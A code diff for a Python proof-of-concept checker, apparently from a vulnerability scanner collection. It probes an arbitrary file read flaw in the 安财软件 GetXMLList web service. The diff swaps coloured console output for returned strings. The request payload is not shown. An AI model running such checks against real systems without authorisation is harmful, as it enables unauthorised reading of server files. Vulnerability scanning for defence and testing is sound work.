@@ -9,8 +9,8 @@ description: 文件/WS/WebServiceBase.asmx/GetXMLList中,参数strXMLFileName存
 import sys
 import json
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class acsoft_GetXMLList_fileread_BaseVerify:
     def __init__(self, url):
@@ -28,12 +28,12 @@ class acsoft_GetXMLList_fileread_BaseVerify:
         try:
             req = requests.post(vulnurl, data=post_data, headers=headers, timeout=10, verify=False)
             if req.headers["Content-Type"] == "application/xml":
-                cprint("[+]存在安财软件GetXMLList任意文件读取漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "red")
+                return "[+]存在安财软件GetXMLList任意文件读取漏洞...(高危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4)
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = acsoft_GetXMLList_fileread_BaseVerify(sys.argv[1])
     testVuln.run()
